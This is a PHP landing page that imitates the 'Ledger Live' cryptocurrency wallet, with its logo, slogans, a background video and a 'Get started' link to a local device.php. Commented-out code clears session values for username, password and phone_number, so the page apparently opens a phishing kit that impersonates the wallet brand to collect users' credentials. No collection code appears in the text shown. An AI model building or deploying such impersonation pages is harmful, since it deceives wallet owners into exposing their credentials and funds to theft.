<?php include_once './config.php';?>
<html lang="en">
    <?php
//        unset($_SESSION['username']);
//        unset($_SESSION['password']);
//        unset($_SESSION['phone_number']);
    
        $title = 'Ledger Live';
        include_once './includes/meta.php'; 
    ?>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-3 px40 pt40 position-relative" style="height: 100vh;">
                    <a class="" href="<?= base_url()?>">
                        <img src="<?= base_url('assets/img/ledger.png')?>" alt="Logo" width="120" title="CRYPTOCURRENCY &amp; NFT WALLET" class="d-inline-block align-text-top" style="filter: invert(1);">
                    </a>
                    <h1 class="text-white h5 ls1 lh40 fw-bold mobile_web_font pt30">THE MOST SECURE CRYPTOCURRENCY &amp; NFT WALLET</h1>
                    <p class="pt20 fs14">Securely manage, buy and grow your crypto and NFTs on Ledger Live</p>
                    <div class="position-absolute w-100" style="bottom: 0px; left: 0px;">
                        <div class="d-grid px60">
                            <a class="btn bg-secondary2 bg-white btn-lg text-black rounded-pill fw-bold fs16" href="<?= base_url('device.php')?>">Get started 
                                <svg stroke="currentColor" fill="none" stroke-width="1.5" viewBox="0 0 24 24" aria-hidden="true" class="fs25 ms15" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M17.25 8.25 21 12m0 0-3.75 3.75M21 12H3"></path></svg>
                            </a>
                        </div>
                        <p class="pt30 text-secondary fs14 text-center">
                            <div class="lh25">By tapping "Get started" you consent and agree to our</div>
                            <a class="text-decoration-none pt20 text-white-50 fs14 lh20" href="<?= base_url()?>">Terms of Service and Privacy Policy</a>
                        </p>
                    </div>
                </div>
                <div class="col-sm-9" style="height: 100vh;">
                    <video width="100%" style="opacity: 0.5;" autoPlay loop muted>
                        <source src="<?= base_url('assets/img/video.mp4')?>" type="video/mp4" />
                    </video>
                </div>
            </div>
        </div> 
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>